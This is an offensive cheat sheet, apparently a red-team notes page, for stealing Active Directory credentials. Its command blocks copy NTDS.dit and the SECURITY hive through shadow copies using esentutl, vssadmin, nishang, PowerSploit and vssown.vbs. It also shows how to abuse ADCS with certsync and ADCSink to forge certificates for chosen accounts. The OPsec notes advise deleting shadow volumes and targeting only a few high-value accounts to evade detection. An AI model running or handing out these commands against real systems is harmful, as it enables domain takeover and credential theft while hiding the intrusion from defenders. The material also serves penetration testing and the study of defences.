# Shadow Copy

The same can be done with SAM and LSA, also don't forget to delete the shadow volume.

## Esentutl method

Need admin privilege on the computer

```bash
esentutl.exe /y /vss C:\Windows\NTDS\NTDS.dit /d C:\ntds.dit.bak
esentutl.exe /y /vss C:\Windows\System32\config\SECURITY /d c:\security
```

## Vssadmin method

Need admin privilege on the computer

```bash
vssadmin create shadow /for=C: 
copy $ShadowCopyName\Windows\NTDS\NTDS.dit C:\ntds.dit.save
copy $ShadowCopyName\Windows\System32\config\SECURITY C:\SECURITY.save 
vssadmin delete shadows /shadow=$ShadowCopyId 
```

## Copy-VSS Method

Need admin privilege on the computer. The ntds and SAM/SYSTEM hives are stored on the same path as the executed script. 

https://github.com/samratashok/nishang

```bash
Import-Module .\nishang.psm1
Copy-VSS
```

## Powersploit Method

https://github.com/PowerShellMafia/PowerSploit

```bash
Import-Module .\PowerSploit.psm1
New-VolumeShadowCopy -Volume C:\
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\ntds\ntds.dit C:\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\System32\config\SECURITY C:\SECURITY
```

## Vssown method

Execute vba script with admin privilege on the computer

https://github.com/lanmaster53/ptscripts/blob/master/windows/vssown.vbs

```
cscript vssown.vbs /start
cscript vssown.vbs /create c
cscript vssown.vbs /list
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\ntds\ntds.dit C:\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\System32\config\SECURITY C:\SECURITY
cscript vssown.vbs /delete 
```

# ADCS  

## Certsync method

Need admin privilege on an ADCS compunent to retrieve the root certificate (CA) and its private keys. Then you can forge your own valid certificate and UnPAC-the-hash.

https://github.com/zblurx/certsync

```bash
certsync -u usenrame -p 'password' -d domain -dc-ip DC_ip -ns DC_ip
```
**OPsec :** Code execution and "certutil" commandes can be detect  


## ADCsink method

Need modifying privilege on a certificate template to push an ESC1 vulnerability. Then you can request a certificate for targetted users own valid certificate and UnPAC-the-hash.

https://github.com/Prepouce/ADCSink

```bash
./ADCSink.sh -u username -d domain -T template_name -t targeted_ca -c ca_name -i dc-ip -U targeted_users [-p password] [-H hash] [-s]
```
The "-s" options could be added if you do not need / want to modify the certifiate template (exemple: you already had an ESC1 vulnerability)



**OPsec :** Do not dump all domain users, one certificate for targeted users will be created. For exemple, only the accounts "Administrator", "krgtbt" and "Interdomain Trust" could be targeted, in order to stay under detection.  


